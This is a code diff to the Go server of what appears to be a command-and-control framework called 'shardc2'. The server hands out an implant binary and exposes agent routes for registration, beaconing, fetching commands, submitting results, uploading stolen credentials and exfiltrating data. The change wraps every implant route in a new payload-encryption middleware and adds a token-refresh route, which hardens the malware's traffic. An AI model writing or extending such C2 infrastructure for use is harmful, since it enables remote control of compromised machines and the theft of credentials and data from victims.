@@ -26,6 +26,7 @@ import (
 type ServerConfig struct {
 	OperatorToken string
 	ImplantKey    string
+	PayloadKey    []byte
 	C2URL         string
 }
 
@@ -79,6 +80,7 @@ func (s *Server) setupRoutes() {
 	// Agent routes (per-route middleware to avoid prefix collision)
 	implantMW := middleware.ImplantAuth(s.config.ImplantKey)
 	agentMW := middleware.AgentAuth(s.db)
+	payloadMW := middleware.PayloadCrypto(s.config.PayloadKey)
 	agentLimiter := limiter.New(limiter.Config{Max: 60, Expiration: time.Minute})
 
 	agent := api.Group("/agent")
@@ -89,12 +91,13 @@ func (s *Server) setupRoutes() {
 		}
 		return c.SendFile("./bin/shardc2-agent", false)
 	})
-	agent.Post("/register", implantMW, botHandler.Register)
-	agent.Post("/beacon", agentMW, agentLimiter, botHandler.AgentBeacon)
-	agent.Get("/commands", agentMW, agentLimiter, cmdHandler.AgentGetPending)
-	agent.Post("/result", agentMW, agentLimiter, cmdHandler.SubmitResult)
-	agent.Post("/credentials", agentMW, agentLimiter, credHandler.Submit)
-	agent.Post("/exfil", agentMW, agentLimiter, exfilHandler.Upload)
+	agent.Post("/register", payloadMW, implantMW, botHandler.Register)
+	agent.Post("/beacon", payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
+	agent.Get("/commands", payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
+	agent.Post("/result", payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
+	agent.Post("/credentials", payloadMW, agentMW, agentLimiter, credHandler.Submit)
+	agent.Post("/exfil", payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
+	agent.Post("/refresh-token", payloadMW, agentMW, botHandler.RefreshToken)
 
 	// Operator routes
 	op := api.Group("", middleware.OperatorAuth(s.config.OperatorToken))
